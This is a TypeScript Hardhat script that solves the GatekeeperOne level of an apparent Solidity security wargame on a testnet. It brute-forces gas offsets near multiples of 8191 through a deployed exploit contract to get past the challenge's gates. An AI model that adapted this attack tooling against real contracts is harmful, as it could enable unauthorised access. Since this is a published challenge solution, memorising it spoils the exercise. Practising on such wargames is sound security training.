import { ethers } from "hardhat";

/**
 * This script helps find the exact gas offset needed for the GatekeeperOne challenge
 * It systematically tries gas values with different offsets from 8191 multiples
 * 
 * Usage:
 * EXPLOIT_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-13-gatekeeper-1/find-gas-offset.ts --network sepolia
 * EXPLOIT_ADDRESS=0xYourExploitAddress BASE=81910 STEP=1 RANGE=300 npx hardhat run scripts/level-13-gatekeeper-1/find-gas-offset.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No GatekeeperOneExploit contract address provided.");
    console.error("Please provide the address of your deployed GatekeeperOneExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-13-gatekeeper-1/find-gas-offset.ts --network sepolia");
    return;
  }
  
  // Get optional parameters with defaults
  const baseGas = process.env.BASE ? parseInt(process.env.BASE) : 81910; // Default to 10*8191
  const step = process.env.STEP ? parseInt(process.env.STEP) : 5;        // Default step size
  const range = process.env.RANGE ? parseInt(process.env.RANGE) : 100;   // Default range
  const maxTries = process.env.MAX_TRIES ? parseInt(process.env.MAX_TRIES) : 50; // Max tries
  
  const exploitAddress = process.env.EXPLOIT_ADDRESS;
  
  console.log(`Using GatekeeperOneExploit contract address: ${exploitAddress}`);
  console.log(`Base gas value: ${baseGas}`);
  console.log(`Step size: ${step}`);
  console.log(`Range: ±${range}`);
  console.log(`Max tries: ${maxTries}`);
  
  // Get the contract factory for GatekeeperOneExploit
  const GatekeeperOneExploit = await ethers.getContractFactory("GatekeeperOneExploit");
  
  // Connect to the deployed contract
  const gatekeeperOneExploit = GatekeeperOneExploit.attach(exploitAddress);
  
  // Get the target contract address
  const targetAddress = await gatekeeperOneExploit.getFunction("gatekeeperAddress")();
  console.log(`Target GatekeeperOne contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check if we already passed the gate
    console.log("Checking if we've already passed the gates...");
    const initialSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (initialSuccess) {
      console.log("Gates were already successfully passed! No need to proceed further.");
      return;
    }
    
    // Generate the gate key for the current tx.origin
    const gateKey = await gatekeeperOneExploit.getFunction("generateGateKey")(deployer.address);
    console.log(`Generated gate key: ${gateKey}`);
    
    // Calculate possible gas values to try
    console.log(`\nTrying gas values around ${baseGas} with step ${step}...`);
    
    // Generate an array of gas values to try
    const gasValues: number[] = [];
    for (let i = -range; i <= range; i += step) {
      gasValues.push(baseGas + i);
    }
    
    // Add some specific known offsets that have worked in various environments
    const knownOffsets = [254, 250, 210, 200, 199, 198];
    for (const offset of knownOffsets) {
      const gasWithOffset = (Math.floor(baseGas / 8191) * 8191) + offset;
      if (!gasValues.includes(gasWithOffset)) {
        gasValues.push(gasWithOffset);
      }
    }
    
    console.log(`Generated ${gasValues.length} gas values to try`);
    
    // Sort by proximity to 8191 multiples to try the most promising values first
    gasValues.sort((a, b) => {
      const aRemainder = a % 8191;
      const bRemainder = b % 8191;
      const aDist = Math.min(aRemainder, 8191 - aRemainder);
      const bDist = Math.min(bRemainder, 8191 - bRemainder);
      return aDist - bDist;
    });
    
    console.log(`First few gas values: ${gasValues.slice(0, 5).join(', ')}...`);
    
    let success = false;
    let workingGas = 0;
    let tries = 0;
    
    // Create an array to track all attempts and results for analysis
    const attempts: {gas: number, result: string, remainder: number}[] = [];
    
    // Try each gas value
    for (const gasToTry of gasValues) {
      if (tries >= maxTries) {
        console.log(`\nReached maximum tries (${maxTries}). Stopping.`);
        break;
      }
      
      tries++;
      console.log(`\n[${tries}/${maxTries}] Trying gas value: ${gasToTry} (${gasToTry % 8191} mod 8191)`);
      
      try {
        // Try to enter with this gas value
        const enterGateTx = await gatekeeperOneExploit.getFunction("enterGate")(gasToTry);
        console.log(`Transaction sent: ${enterGateTx.hash}`);
        
        // Wait for transaction to be mined
        const receipt = await enterGateTx.wait();
        
        // Check if successful
        const txSuccess = await gatekeeperOneExploit.getFunction("success")();
        const isEntrant = await gatekeeperOneExploit.getFunction("checkSuccess")();
        
        const result = txSuccess || isEntrant ? "SUCCESS" : "failed";
        attempts.push({gas: gasToTry, result, remainder: gasToTry % 8191});
        
        if (txSuccess || isEntrant) {
          success = true;
          workingGas = gasToTry;
          console.log(`🎉 SUCCESS! Gas value ${gasToTry} worked!`);
          break;
        } else {
          console.log(`❌ Gas value ${gasToTry} failed`);
        }
      } catch (error: any) {
        const errorMsg = error.message ? error.message.slice(0, 100) : 'unknown error';
        console.log(`❌ Gas ${gasToTry} failed: ${errorMsg}`);
        attempts.push({gas: gasToTry, result: "ERROR", remainder: gasToTry % 8191});
      }
    }
    
    // Final check
    const finalSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (finalSuccess) {
      console.log("\n🎉 EXPLOIT SUCCESSFUL! You've passed all gates and become the entrant!");
      console.log(`Working gas value: ${workingGas}`);
      console.log(`Modulo 8191: ${workingGas % 8191}`);
      
      // Calculate the offset from the nearest 8191 multiple for future reference
      const nearestMultiple = Math.floor(workingGas / 8191) * 8191;
      const offset = workingGas - nearestMultiple;
      console.log(`\nAnalysis: ${workingGas} = (${nearestMultiple} = ${Math.floor(workingGas / 8191)} * 8191) + ${offset}`);
      
      // Save the successful value to file
      try {
        const fs = require('fs');
        const path = require('path');
        const valuesFile = path.join(__dirname, 'successful-gas.json');
        fs.writeFileSync(valuesFile, JSON.stringify({
          gasValue: workingGas,
          offset,
          multiple: nearestMultiple,
          address: deployer.address,
          timestamp: new Date().toISOString()
        }, null, 2));
        console.log(`\n💾 Successful gas value saved to ${valuesFile} for future reference`);
      } catch (error) {
        console.log("Could not save gas value to file");
      }
      
      // Show command to use this value directly
      console.log(`\nTo use this gas value directly, run:`);
      console.log(`EXPLOIT_ADDRESS=${exploitAddress} SPECIFIC_GAS=${workingGas} npx hardhat run scripts/level-13-gatekeeper-1/direct-exploit.ts --network sepolia`);
    } else {
      console.log("\n❌ Could not find a working gas value.");
      
      // Analyze the attempts
      console.log("\nAnalysis of attempts:");
      
      // Group by remainder
      const remainderGroups: Record<number, number> = {};
      attempts.forEach(attempt => {
        if (!remainderGroups[attempt.remainder]) {
          remainderGroups[attempt.remainder] = 0;
        }
        remainderGroups[attempt.remainder]++;
      });
      
      // Show the most common remainders
      console.log("Most common remainders from attempts:");
      Object.entries(remainderGroups)
        .sort(([_, a], [__, b]) => b - a)
        .slice(0, 5)
        .forEach(([remainder, count]) => {
          console.log(`Remainder ${remainder}: ${count} attempts`);
        });
      
      console.log("\nTry these approaches:");
      console.log(`1. Try with a smaller step size: STEP=1 RANGE=50 BASE=${baseGas}`);
      console.log("2. Try with a different base gas value: BASE=24500 STEP=1 RANGE=100");
      console.log("3. Try the known working offsets: 254, 210, 200, etc.");
      console.log("4. Try on a local hardhat network which may be more predictable");
    }
  } catch (error: any) {
    console.error("\nError:", error.message || error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
